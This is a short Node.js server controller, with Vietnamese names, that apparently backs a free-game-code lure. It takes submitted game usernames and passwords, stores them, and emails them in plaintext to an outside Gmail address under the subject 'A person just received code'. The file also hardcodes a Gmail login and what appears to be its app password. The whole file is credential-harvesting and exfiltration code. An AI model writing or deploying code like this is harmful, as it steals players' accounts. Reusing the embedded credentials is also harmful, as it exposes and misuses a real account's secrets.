const taiKhoanModel = require("../models/taiKhoanModel");

module.exports.sendTaiKhoan = async (req, res) => {
  const user = req.body.user;
  const pass = req.body.pass;
  const tenGame = req.body.tenGame;

  var nodemailer = require("nodemailer");
  var smtpTransport = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "codesecret147@gmail.com",
      pass: "rgpzocgxyvdpbytx",
    },
  });
  const createUser = await taiKhoanModel.create({
    user,
    pass,
    tenGame,
  });
  if (!createUser) {
    console.log("tao that bai");
  } else {
    var mailOptions = {
      from: "codesecret147@gmail.com",
      to: "hiimbeno2@gmail.com",
      subject: "Một người vùa nhận code: ",
      html:
        "Thông tin tai khoản: <br> Tên game: " +
        createUser.tenGame +
        "<br> Tài khoản: " +
        createUser.user +
        "<br> Mật khẩu: " +
        createUser.pass,
    };

    smtpTransport.sendMail(mailOptions, function (error, response) {});
    res.json(createUser.user);
  }
};
